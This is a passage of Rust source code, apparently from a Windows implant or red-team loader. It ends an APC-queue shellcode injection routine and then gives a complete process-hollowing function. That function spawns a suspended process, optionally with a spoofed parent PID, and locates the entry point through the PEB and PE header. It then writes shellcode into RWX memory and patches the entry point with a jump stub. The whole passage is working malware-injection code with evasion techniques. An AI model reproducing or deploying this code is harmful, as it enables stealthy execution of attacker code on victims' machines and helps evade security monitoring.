        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Write shellcode to allocated memory
    let write_success = unsafe {
        (get_instance().unwrap().k32.write_process_memory)(
            process_info.h_process,
            remote_mem as *const c_void,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            null_mut(),
        )
    };

    if !write_success {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Queue APC to the suspended thread to run our shellcode
    let apc_result = unsafe {
        (get_instance().unwrap().k32.queue_user_apc)(
            remote_mem,
            process_info.h_thread,
            0,
        )
    };

    if apc_result == 0 {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Resume the thread - APC will execute before the entry point
    unsafe { (get_instance().unwrap().k32.resume_thread)(process_info.h_thread) };

    Ok(())
}

/// Process hollowing with JMP stub at entry point.
/// Allocates RWX memory for shellcode, writes JMP stub at entry point to redirect execution.
pub fn hollow(
    image: &str,
    task: Option<u8>,
    magic: Option<u32>,
    ppid: Option<u32>,
) -> Result<(), u32> {
    let shellcode = get_shellcode(task, magic);

    let mut exe_path: Vec<u16> = image.encode_utf16().chain(Some(0)).collect();
    let mut process_info = ProcessInformation::new();

    if let Some(parent_pid) = ppid {
        // PPID spoofing path - use extended startup info
        let mut startup_info_ex: StartupInfoExW = unsafe { zeroed() };
        startup_info_ex.StartupInfo.cb = size_of::<StartupInfoExW>() as u32;

        let parent_handle: *mut c_void = unsafe {
            (get_instance().unwrap().k32.open_process)(
                0x2000000, // PROCESS_ALL_ACCESS
                false,
                parent_pid,
            )
        };

        if parent_handle.is_null() {
            return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
        }

        let mut size = 0;
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(null_mut(), 1, 0, &mut size)
        };
        startup_info_ex.lpAttributeList = unsafe {
            (get_instance().unwrap().k32.heap_alloc)(
                (get_instance().unwrap().k32.get_process_heap)(),
                0,
                size,
            )
        };
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(
                startup_info_ex.lpAttributeList,
                1,
                0,
                &mut size,
            )
        };
        unsafe {
            (get_instance().unwrap().k32.update_proc_thread_attribute)(
                startup_info_ex.lpAttributeList,
                0,
                0x20000,
                &parent_handle as *const _ as *const c_void,
                size_of::<*mut c_void>(),
                null_mut(),
                null(),
            )
        };

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                false,
                4 | 0x80000, // CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT
                null_mut(),
                null_mut(),
                &mut startup_info_ex.StartupInfo,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    } else {
        // Simple path - use basic startup info
        let mut startup_info: StartupInfoW = unsafe { zeroed() };
        startup_info.cb = size_of::<StartupInfoW>() as u32;

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                false,
                4, // CREATE_SUSPENDED only
                null_mut(),
                null_mut(),
                &mut startup_info,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    }

    // Get PEB to find image base
    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    if unsafe {
        (get_instance().unwrap().ntdll.nt_query_information_process)(
            process_info.h_process,
            0,
            &mut process_basic_info as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        )
    } != 0 {
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(0x80004005);
    }

    // Read image base from PEB+0x10
    let image_base_offset: *const c_void =
        unsafe { process_basic_info.peb_base_address.byte_add(0x10) as *const c_void };

    let mut image_base_addr: [u8; 8] = [0; 8];
    let mut bytes_read = 0;
    if !unsafe {
        (get_instance().unwrap().k32.read_process_memory)(
            process_info.h_process,
            image_base_offset,
            image_base_addr.as_mut_ptr() as *mut _,
            image_base_addr.len(),
            &mut bytes_read,
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Read PE header to find entry point
    let mut image_buffer: [u8; 400] = [0; 400];
    if !unsafe {
        (get_instance().unwrap().k32.read_process_memory)(
            process_info.h_process,
            usize::from_le_bytes(image_base_addr) as *const c_void,
            image_buffer.as_mut_ptr() as *mut _,
            image_buffer.len(),
            &mut bytes_read,
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    let header_offset = u32::from_le_bytes(image_buffer[0x3c..0x40].try_into().unwrap());
    let entry_offset_loc: usize = (header_offset + 0x28) as usize;
    let entry_offset = u32::from_le_bytes(
        image_buffer[entry_offset_loc..entry_offset_loc + 0x4]
            .try_into()
            .unwrap(),
    );

    let image_base = usize::from_le_bytes(image_base_addr);
    let entry_addr = image_base.wrapping_add(entry_offset as usize);

    // Allocate memory in target process for shellcode
    let remote_mem = unsafe {
        (get_instance().unwrap().k32.virtual_alloc_ex)(
            process_info.h_process,
            null_mut(),
            shellcode.len(),
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        )
    };

    if remote_mem.is_null() {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Write shellcode to allocated memory
    if !unsafe {
        (get_instance().unwrap().k32.write_process_memory)(
            process_info.h_process,
            remote_mem as *const c_void,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            null_mut(),
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Build JMP stub: mov rax, <addr>; jmp rax
    // 48 B8 <8-byte addr>  ; mov rax, imm64
    // FF E0                ; jmp rax
    let shellcode_addr = remote_mem as u64;
    let mut jmp_stub: [u8; 12] = [0; 12];
    jmp_stub[0] = 0x48; // REX.W
    jmp_stub[1] = 0xB8; // mov rax, imm64
    jmp_stub[2..10].copy_from_slice(&shellcode_addr.to_le_bytes());
    jmp_stub[10] = 0xFF; // jmp rax
    jmp_stub[11] = 0xE0;

    // Make entry point writable
    let mut old_protect: u32 = 0;
    if !unsafe {
        (get_instance().unwrap().k32.virtual_protect_ex)(
            process_info.h_process,
            entry_addr as *const c_void,
            jmp_stub.len(),
            0x40, // PAGE_EXECUTE_READWRITE
            &mut old_protect,
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Write JMP stub to entry point
    if !unsafe {
        (get_instance().unwrap().k32.write_process_memory)(
            process_info.h_process,
            entry_addr as *const c_void,
            jmp_stub.as_ptr() as *const c_void,
            jmp_stub.len(),
            null_mut(),
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 1) };
        return Err(err);
    }

    // Resume thread - will execute JMP stub which jumps to shellcode
    unsafe { (get_instance().unwrap().k32.resume_thread)(process_info.h_thread) };

    Ok(())
}